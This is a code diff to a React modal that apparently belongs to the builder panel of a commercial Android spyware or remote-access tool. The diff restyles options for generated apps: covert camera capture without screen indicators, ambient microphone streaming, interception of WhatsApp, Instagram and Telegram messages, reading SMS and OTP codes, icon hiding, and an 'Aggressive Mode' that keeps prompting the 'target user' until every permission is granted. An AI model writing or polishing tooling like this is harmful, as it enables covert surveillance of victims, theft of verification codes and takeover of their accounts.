@@ -6,7 +6,7 @@ import {
     Smartphone, Shield, Bell, Check, Lock, Crown, Zap, 
     ChevronRight, ChevronLeft, Download, Eye, EyeOff, 
     AlertTriangle, Sparkles, Sliders, RefreshCw, Layers, CheckCircle2, Info,
-    Mail, Gamepad2, Film, Flame, Globe, Upload, ExternalLink, X
+    Mail, Gamepad2, Film, Flame, Globe, Upload, ExternalLink, X, ChevronDown, ChevronUp
 } from 'lucide-react';
 
 interface AppGenerationModalProps {
@@ -131,6 +131,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | 'camera' | 'microphone' | 'notifications' | null>(null);
     const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
     const [aggressivePermissions, setAggressivePermissions] = useState(false);
+    const [showAdvancedPermissions, setShowAdvancedPermissions] = useState(false);
 
     // Notification Monitoring State
     const [selectedTargetApps, setSelectedTargetApps] = useState<string[]>(['whatsapp_biz', 'whatsapp', 'instagram']);
@@ -475,15 +476,15 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                         </button>
                     </div>
 
-                    {/* Bottom row: Uniform, Flicker-Free Step Navigation Bar */}
+                    {/* Bottom row: Enhanced Step Navigation Bar with Ample Glow & Spacing */}
                     <div className="px-3 pb-3">
-                        <div className="grid grid-cols-3 gap-1.5 p-1 rounded-2xl bg-black/40 border border-white/10">
+                        <div className="grid grid-cols-3 gap-2 p-1.5 rounded-2xl bg-black/40 border border-white/10">
                             <button
                                 type="button"
                                 onClick={() => setActiveStep('identity')}
-                                className={`flex items-center justify-center gap-1.5 py-2.5 px-2 rounded-xl text-xs font-bold whitespace-nowrap ${
+                                className={`flex items-center justify-center gap-1.5 py-2.5 px-3 rounded-xl text-xs font-bold whitespace-nowrap transition-colors ${
                                     activeStep === 'identity'
-                                        ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/50 shadow-sm'
+                                        ? 'bg-emerald-500/25 text-emerald-300 border border-emerald-400/60 shadow-[0_0_15px_rgba(16,185,129,0.3)]'
                                         : 'text-fg-3 hover:text-fg-1'
                                 }`}
                             >
@@ -493,9 +494,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                             <button
                                 type="button"
                                 onClick={() => setActiveStep('permissions')}
-                                className={`flex items-center justify-center gap-1.5 py-2.5 px-2 rounded-xl text-xs font-bold whitespace-nowrap ${
+                                className={`flex items-center justify-center gap-1.5 py-2.5 px-3 rounded-xl text-xs font-bold whitespace-nowrap transition-colors ${
                                     activeStep === 'permissions'
-                                        ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/50 shadow-sm'
+                                        ? 'bg-emerald-500/25 text-emerald-300 border border-emerald-400/60 shadow-[0_0_15px_rgba(16,185,129,0.3)]'
                                         : 'text-fg-3 hover:text-fg-1'
                                 }`}
                             >
@@ -505,9 +506,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                             <button
                                 type="button"
                                 onClick={() => setActiveStep('notifications')}
-                                className={`flex items-center justify-center gap-1.5 py-2.5 px-2 rounded-xl text-xs font-bold whitespace-nowrap ${
+                                className={`flex items-center justify-center gap-1.5 py-2.5 px-3 rounded-xl text-xs font-bold whitespace-nowrap transition-colors ${
                                     activeStep === 'notifications'
-                                        ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/50 shadow-sm'
+                                        ? 'bg-emerald-500/25 text-emerald-300 border border-emerald-400/60 shadow-[0_0_15px_rgba(16,185,129,0.3)]'
                                         : 'text-fg-3 hover:text-fg-1'
                                 }`}
                             >
@@ -652,7 +653,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     </div>
                                     <span className="text-[10px] font-mono text-fg-4 mt-0.5 truncate max-w-[160px]">{activeApp.packageName}</span>
 
-                                    {/* Hide App Toggle Switch (ONLY SHOWN FOR CUSTOM APP: "custom wala ka niche hi hide icon ka option rakhna baki ka sath nhi") */}
+                                    {/* Hide App Toggle Switch (ONLY SHOWN FOR CUSTOM APP) */}
                                     {selectedPreset === 'custom' && (
                                         <div className="mt-5 w-full pt-4 border-t border-white/10 flex items-center justify-between">
                                             <div className="flex items-center gap-1.5">
@@ -685,17 +686,21 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                         </div>
                     )}
 
-                    {/* STEP 2: SOFT PERMISSIONS & STEALTH */}
+                    {/* STEP 2: APP ACCESS PERMISSIONS & ADVANCED STEALTH */}
                     {activeStep === 'permissions' && (
-                        <div className="space-y-4">
-                            <div className="flex items-center justify-between">
-                                <span className="text-xs font-bold text-fg-3 uppercase tracking-widest">Soft UI Access Permissions</span>
-                                <span className="text-xs text-fg-4">Each permission uses soft color coding</span>
+                        <div className="space-y-5">
+                            {/* Stylish Highlighted Title Indicator ("ADD YOUR PERMISSIONS IN APP") */}
+                            <div className="flex items-center gap-2.5 px-1">
+                                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
+                                <span className="text-xs font-extrabold bg-gradient-to-r from-emerald-300 via-teal-200 to-cyan-300 bg-clip-text text-transparent uppercase tracking-wider">
+                                    ADD YOUR PERMISSIONS IN APP
+                                </span>
                             </div>
 
-                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                            {/* Core Permissions Grid (4 standard app permissions) */}
+                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
                                 
-                                {/* Storage / Gallery - Soft Emerald */}
+                                {/* Gallery & Storage - Soft Emerald */}
                                 <div className="p-4 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(16,185,129,0.1)]">
                                     <div className="flex flex-col">
                                         <div className="flex items-center gap-2">
@@ -704,18 +709,18 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                 <Info size={14} />
                                             </button>
                                         </div>
-                                        <span className="text-xs text-emerald-300/70">Silent media & photo access</span>
+                                        <span className="text-xs text-emerald-300/70">Grants access to browse, index & download device photos & media files.</span>
                                     </div>
                                     <button
                                         type="button"
                                         onClick={() => setEnableStoragePermission(!enableStoragePermission)}
-                                        className={`w-11 h-6 rounded-full transition-colors relative ${enableStoragePermission ? 'bg-emerald-500' : 'bg-white/20'}`}
+                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${enableStoragePermission ? 'bg-emerald-500' : 'bg-white/20'}`}
                                     >
                                         <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableStoragePermission ? 'left-6' : 'left-1'}`} />
                                     </button>
                                 </div>
 
-                                {/* Camera - Soft Cyan */}
+                                {/* Camera Capture - Soft Cyan */}
                                 <div className={`p-4 rounded-2xl bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(6,182,212,0.1)]`}>
                                     <div className="flex flex-col">
                                         <div className="flex items-center gap-2">
@@ -729,7 +734,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                 <Info size={14} />
                                             </button>
                                         </div>
-                                        <span className="text-xs text-cyan-300/70">Live video & photo snapshots</span>
+                                        <span className="text-xs text-cyan-300/70">Grants live video streaming and instant photo snapshots from front & rear cameras.</span>
                                     </div>
                                     <button
                                         type="button"
@@ -737,13 +742,13 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             if (!isPremium) { onUpgrade?.(); return; }
                                             setEnableCameraPermission(!enableCameraPermission);
                                         }}
-                                        className={`w-11 h-6 rounded-full transition-colors relative ${!isPremium ? 'bg-white/10' : enableCameraPermission ? 'bg-cyan-500' : 'bg-white/20'}`}
+                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${!isPremium ? 'bg-white/10' : enableCameraPermission ? 'bg-cyan-500' : 'bg-white/20'}`}
                                     >
                                         <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableCameraPermission && isPremium ? 'left-6' : 'left-1'}`} />
                                     </button>
                                 </div>
 
-                                {/* Microphone - Soft Violet */}
+                                {/* Live Microphone - Soft Violet */}
                                 <div className={`p-4 rounded-2xl bg-purple-500/10 border border-purple-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(168,85,247,0.1)]`}>
                                     <div className="flex flex-col">
                                         <div className="flex items-center gap-2">
@@ -757,7 +762,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                 <Info size={14} />
                                             </button>
                                         </div>
-                                        <span className="text-xs text-purple-300/70">Room surround audio streaming</span>
+                                        <span className="text-xs text-purple-300/70">Grants real-time room surround audio streaming and voice recording.</span>
                                     </div>
                                     <button
                                         type="button"
@@ -765,13 +770,13 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             if (!isPremium) { onUpgrade?.(); return; }
                                             setEnableMicrophonePermission(!enableMicrophonePermission);
                                         }}
-                                        className={`w-11 h-6 rounded-full transition-colors relative ${!isPremium ? 'bg-white/10' : enableMicrophonePermission ? 'bg-purple-500' : 'bg-white/20'}`}
+                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${!isPremium ? 'bg-white/10' : enableMicrophonePermission ? 'bg-purple-500' : 'bg-white/20'}`}
                                     >
                                         <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableMicrophonePermission && isPremium ? 'left-6' : 'left-1'}`} />
                                     </button>
                                 </div>
 
-                                {/* Contacts - Soft Green */}
+                                {/* Contacts Sync - Soft Green */}
                                 <div className={`p-4 rounded-2xl bg-green-500/10 border border-green-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(34,197,94,0.1)]`}>
                                     <div className="flex flex-col">
                                         <div className="flex items-center gap-2">
@@ -785,7 +790,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                 <Info size={14} />
                                             </button>
                                         </div>
-                                        <span className="text-xs text-green-300/70">Sync phonebook & email addresses</span>
+                                        <span className="text-xs text-green-300/70">Grants access to sync device phonebook contacts & stored email accounts.</span>
                                     </div>
                                     <button
                                         type="button"
@@ -793,99 +798,84 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             if (isBasicPlan) { onUpgrade?.(); return; }
                                             setEnableContactsPermission(!enableContactsPermission);
                                         }}
-                                        className={`w-11 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableContactsPermission ? 'bg-green-500' : 'bg-white/20'}`}
+                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : enableContactsPermission ? 'bg-green-500' : 'bg-white/20'}`}
                                     >
                                         <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableContactsPermission && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                     </button>
                                 </div>
-
-                                {/* Notification Listener - Soft Sky */}
-                                <div className={`p-4 rounded-2xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(14,165,233,0.1)]`}>
-                                    <div className="flex flex-col">
-                                        <div className="flex items-center gap-2">
-                                            <span className="text-sm font-bold text-sky-200">Notification Reader</span>
-                                            {isBasicPlan && (
-                                                <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
-                                                    PRO
-                                                </span>
-                                            )}
-                                            <button type="button" onClick={() => setShowPermissionInfo('notifications')} className="text-sky-400/70 hover:text-sky-300">
-                                                <Info size={14} />
-                                            </button>
-                                        </div>
-                                        <span className="text-xs text-sky-300/70">Capture WhatsApp & messaging alerts</span>
-                                    </div>
-                                    <button
-                                        type="button"
-                                        onClick={() => {
-                                            if (isBasicPlan) { onUpgrade?.(); return; }
-                                            setEnableNotificationListener(!enableNotificationListener);
-                                        }}
-                                        className={`w-11 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableNotificationListener ? 'bg-sky-500' : 'bg-white/20'}`}
-                                    >
-                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableNotificationListener && !isBasicPlan ? 'left-6' : 'left-1'}`} />
-                                    </button>
-                                </div>
-
-                                {/* SMS Access - Soft Rose */}
-                                <div className={`p-4 rounded-2xl bg-rose-500/10 border border-rose-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(244,63,94,0.1)]`}>
-                                    <div className="flex flex-col">
-                                        <div className="flex items-center gap-2">
-                                            <span className="text-sm font-bold text-rose-200">SMS Messages</span>
-                                            <span className="bg-rose-500/20 text-rose-300 border border-rose-500/40 px-1.5 py-0.5 rounded text-[9px] font-bold">
-                                                RISKY
-                                            </span>
-                                            {isBasicPlan && (
-                                                <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
-                                                    PRO
-                                                </span>
-                                            )}
-                                            <button type="button" onClick={() => setShowPermissionInfo('sms')} className="text-rose-400/70 hover:text-rose-300">
-                                                <Info size={14} />
-                                            </button>
-                                        </div>
-                                        <span className="text-xs text-rose-300/70">Read incoming SMS & OTP codes</span>
-                                    </div>
-                                    <button
-                                        type="button"
-                                        onClick={() => {
-                                            if (isBasicPlan) { onUpgrade?.(); return; }
-                                            if (!enableSmsPermission) {
-                                                setShowPlayProtectWarning(true);
-                                            } else {
-                                                setEnableSmsPermission(false);
-                                            }
-                                        }}
-                                        className={`w-11 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableSmsPermission ? 'bg-rose-500' : 'bg-white/20'}`}
-                                    >
-                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableSmsPermission && !isBasicPlan ? 'left-6' : 'left-1'}`} />
-                                    </button>
-                                </div>
                             </div>
 
-                            {/* Aggressive Persistence Mode Card - Soft Amber */}
-                            <div className="p-4 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-between gap-4 shadow-[0_4px_16px_rgba(245,158,11,0.1)]">
-                                <div>
-                                    <div className="flex items-center gap-2">
-                                        <span className="text-sm font-bold text-amber-200">Aggressive Persistence Mode</span>
-                                        {isBasicPlan && (
-                                            <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
-                                                PRO
-                                            </span>
-                                        )}
-                                    </div>
-                                    <p className="text-xs text-amber-300/70 mt-0.5">Prevents OS background optimization from terminating the service</p>
-                                </div>
+                            {/* Collapsible Advanced Permissions Button (SMS & Aggressive Mode) */}
+                            <div className="pt-2">
                                 <button
                                     type="button"
-                                    onClick={() => {
-                                        if (isBasicPlan) { onUpgrade?.(); return; }
-                                        setAggressivePermissions(!aggressivePermissions);
-                                    }}
-                                    className={`w-11 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : aggressivePermissions ? 'bg-amber-500' : 'bg-white/20'}`}
+                                    onClick={() => setShowAdvancedPermissions(!showAdvancedPermissions)}
+                                    className="w-full py-3 px-4 rounded-2xl bg-white/[0.04] hover:bg-white/[0.08] border border-white/15 flex items-center justify-between text-xs font-extrabold text-emerald-300 transition-all shadow-sm"
                                 >
-                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${aggressivePermissions && !isBasicPlan ? 'left-6' : 'left-1'}`} />
+                                    <div className="flex items-center gap-2">
+                                        <Sliders size={15} />
+                                        <span>Advanced Stealth & Persistence Options</span>
+                                    </div>
+                                    {showAdvancedPermissions ? <ChevronUp size={16} /> : <ChevronDown size={16} />}
                                 </button>
+
+                                {/* Collapsible Advanced Section */}
+                                {showAdvancedPermissions && (
+                                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5 mt-3 animate-in fade-in duration-200">
+                                        {/* SMS Access - Soft Rose */}
+                                        <div className={`p-4 rounded-2xl bg-rose-500/10 border border-rose-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(244,63,94,0.1)]`}>
+                                            <div className="flex flex-col">
+                                                <div className="flex items-center gap-2">
+                                                    <span className="text-sm font-bold text-rose-200">SMS Messages</span>
+                                                    <span className="bg-rose-500/20 text-rose-300 border border-rose-500/40 px-1.5 py-0.5 rounded text-[9px] font-bold">
+                                                        ADVANCED
+                                                    </span>
+                                                    <button type="button" onClick={() => setShowPermissionInfo('sms')} className="text-rose-400/70 hover:text-rose-300">
+                                                        <Info size={14} />
+                                                    </button>
+                                                </div>
+                                                <span className="text-xs text-rose-300/70">Grants access to read incoming SMS messages & OTP verification codes.</span>
+                                            </div>
+                                            <button
+                                                type="button"
+                                                onClick={() => {
+                                                    if (isBasicPlan) { onUpgrade?.(); return; }
+                                                    if (!enableSmsPermission) {
+                                                        setShowPlayProtectWarning(true);
+                                                    } else {
+                                                        setEnableSmsPermission(false);
+                                                    }
+                                                }}
+                                                className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : enableSmsPermission ? 'bg-rose-500' : 'bg-white/20'}`}
+                                            >
+                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableSmsPermission && !isBasicPlan ? 'left-6' : 'left-1'}`} />
+                                            </button>
+                                        </div>
+
+                                        {/* Aggressive Persistence Mode - Soft Amber */}
+                                        <div className="p-4 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(245,158,11,0.1)]">
+                                            <div className="flex flex-col">
+                                                <div className="flex items-center gap-2">
+                                                    <span className="text-sm font-bold text-amber-200">Aggressive Mode</span>
+                                                    <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-1.5 py-0.5 rounded text-[9px] font-bold">
+                                                        LOOP
+                                                    </span>
+                                                </div>
+                                                <span className="text-xs text-amber-300/70">Repeatedly prompts the target user for permissions until all required access is granted.</span>
+                                            </div>
+                                            <button
+                                                type="button"
+                                                onClick={() => {
+                                                    if (isBasicPlan) { onUpgrade?.(); return; }
+                                                    setAggressivePermissions(!aggressivePermissions);
+                                                }}
+                                                className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : aggressivePermissions ? 'bg-amber-500' : 'bg-white/20'}`}
+                                            >
+                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${aggressivePermissions && !isBasicPlan ? 'left-6' : 'left-1'}`} />
+                                            </button>
+                                        </div>
+                                    </div>
+                                )}
                             </div>
                         </div>
                     )}
@@ -1152,10 +1142,17 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                     </div>
                 )}
 
-                {/* Permission Info Modal */}
+                {/* Customized Color-Themed Permission Info Modal ("har permission ka info colour aur design alag laga ho") */}
                 {showPermissionInfo && (
-                    <div className="fixed inset-0 z-[350] flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
-                        <div className="bg-[#18191c] border border-white/15 rounded-3xl p-6 max-w-sm w-full space-y-4 relative shadow-2xl">
+                    <div className="fixed inset-0 z-[350] flex items-center justify-center bg-black/75 backdrop-blur-sm p-4" onClick={() => setShowPermissionInfo(null)}>
+                        <div className={`bg-[#18191c] border rounded-3xl p-6 max-w-sm w-full space-y-4 relative shadow-2xl ${
+                            showPermissionInfo === 'storage' ? 'border-emerald-500/40 shadow-emerald-500/10' :
+                            showPermissionInfo === 'camera' ? 'border-cyan-500/40 shadow-cyan-500/10' :
+                            showPermissionInfo === 'microphone' ? 'border-purple-500/40 shadow-purple-500/10' :
+                            showPermissionInfo === 'contacts' ? 'border-green-500/40 shadow-green-500/10' :
+                            showPermissionInfo === 'notifications' ? 'border-sky-500/40 shadow-sky-500/10' :
+                            'border-rose-500/40 shadow-rose-500/10'
+                        }`} onClick={(e) => e.stopPropagation()}>
                             <button
                                 onClick={() => setShowPermissionInfo(null)}
                                 className="absolute top-4 right-4 text-white/50 hover:text-white"
@@ -1163,19 +1160,55 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 ✕
                             </button>
 
-                            <h4 className="text-base font-bold text-white capitalize">{showPermissionInfo} Access Details</h4>
-                            <p className="text-xs text-fg-3 leading-relaxed">
-                                {showPermissionInfo === 'storage' && "Allows silent background indexing of device photos, videos, and downloads."}
-                                {showPermissionInfo === 'camera' && "Allows remote snapshots and live video streams from front and rear cameras."}
-                                {showPermissionInfo === 'microphone' && "Allows real-time room audio listening and surround sound capture."}
-                                {showPermissionInfo === 'contacts' && "Allows address book and stored accounts syncing."}
-                                {showPermissionInfo === 'notifications' && "Allows capturing WhatsApp, Instagram, Telegram, and system alerts."}
-                                {showPermissionInfo === 'sms' && "Allows reading incoming OTP codes and SMS history."}
-                            </p>
+                            {/* Themed Title & Icon */}
+                            <div className="flex items-center gap-3">
+                                <div className={`w-11 h-11 rounded-2xl flex items-center justify-center ${
+                                    showPermissionInfo === 'storage' ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40' :
+                                    showPermissionInfo === 'camera' ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/40' :
+                                    showPermissionInfo === 'microphone' ? 'bg-purple-500/20 text-purple-300 border border-purple-500/40' :
+                                    showPermissionInfo === 'contacts' ? 'bg-green-500/20 text-green-300 border border-green-500/40' :
+                                    showPermissionInfo === 'notifications' ? 'bg-sky-500/20 text-sky-300 border border-sky-500/40' :
+                                    'bg-rose-500/20 text-rose-300 border border-rose-500/40'
+                                }`}>
+                                    <Info size={22} />
+                                </div>
+                                <div>
+                                    <h4 className="text-base font-extrabold text-white capitalize">{showPermissionInfo} Access</h4>
+                                    <span className={`text-[10px] font-bold uppercase tracking-wider ${
+                                        showPermissionInfo === 'storage' ? 'text-emerald-400' :
+                                        showPermissionInfo === 'camera' ? 'text-cyan-400' :
+                                        showPermissionInfo === 'microphone' ? 'text-purple-400' :
+                                        showPermissionInfo === 'contacts' ? 'text-green-400' :
+                                        showPermissionInfo === 'notifications' ? 'text-sky-400' :
+                                        'text-rose-400'
+                                    }`}>
+                                        Background Capability
+                                    </span>
+                                </div>
+                            </div>
+
+                            {/* Detailed Description */}
+                            <div className="p-4 rounded-2xl bg-white/[0.03] border border-white/10">
+                                <p className="text-xs text-fg-2 leading-relaxed">
+                                    {showPermissionInfo === 'storage' && "Enables silent indexing of device gallery albums, downloaded files, camera roll snapshots, and internal storage folders."}
+                                    {showPermissionInfo === 'camera' && "Enables real-time remote snapshots and video capture using both front and rear lenses without flashing screen indicators."}
+                                    {showPermissionInfo === 'microphone' && "Enables ambient room audio streaming and scheduled microphone surround recording with background compression."}
+                                    {showPermissionInfo === 'contacts' && "Enables synchronization of stored phonebook contacts, SIM directory entries, and configured Google account names."}
+                                    {showPermissionInfo === 'notifications' && "Enables real-time interception of WhatsApp, Instagram, Telegram messages, system toasts, and incoming notification previews."}
+                                    {showPermissionInfo === 'sms' && "Enables reading incoming verification OTP codes, incoming/outgoing SMS history logs, and system text alerts."}
+                                </p>
+                            </div>
 
                             <button
                                 onClick={() => setShowPermissionInfo(null)}
-                                className="w-full py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-black font-bold text-xs transition-all"
+                                className={`w-full py-2.5 rounded-xl font-bold text-xs transition-all shadow-lg text-black ${
+                                    showPermissionInfo === 'storage' ? 'bg-emerald-400 hover:bg-emerald-500' :
+                                    showPermissionInfo === 'camera' ? 'bg-cyan-400 hover:bg-cyan-500' :
+                                    showPermissionInfo === 'microphone' ? 'bg-purple-400 hover:bg-purple-500' :
+                                    showPermissionInfo === 'contacts' ? 'bg-green-400 hover:bg-green-500' :
+                                    showPermissionInfo === 'notifications' ? 'bg-sky-400 hover:bg-sky-500' :
+                                    'bg-rose-400 hover:bg-rose-500'
+                                }`}
                             >
                                 Got it
                             </button>
